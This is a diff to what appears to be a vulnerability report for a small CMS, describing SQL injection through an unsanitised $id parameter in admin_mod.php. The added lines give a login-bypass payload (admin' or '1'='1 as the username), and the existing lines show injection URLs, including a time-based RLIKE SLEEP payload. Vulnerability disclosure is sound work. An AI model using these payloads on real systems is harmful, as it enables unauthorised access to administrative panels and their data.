@@ -15,6 +15,10 @@ affected reason:
       We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/manager/admin_mod.php
 --------------------------------
 affected executable: 
+  
+  visit url:http://127.0.0.1/cms/5/admin/login.php
+  use: admin' or '1'='1 as the username;  Then we can log in to the background with any password.
+  
   Like this: http://xx.xx.com/admin/manager/admin_mod.php?id=1'
              http://xx.xx.com/admin/manager/admin_mod.php?id=1 RLIKE SLEEP(2)
              
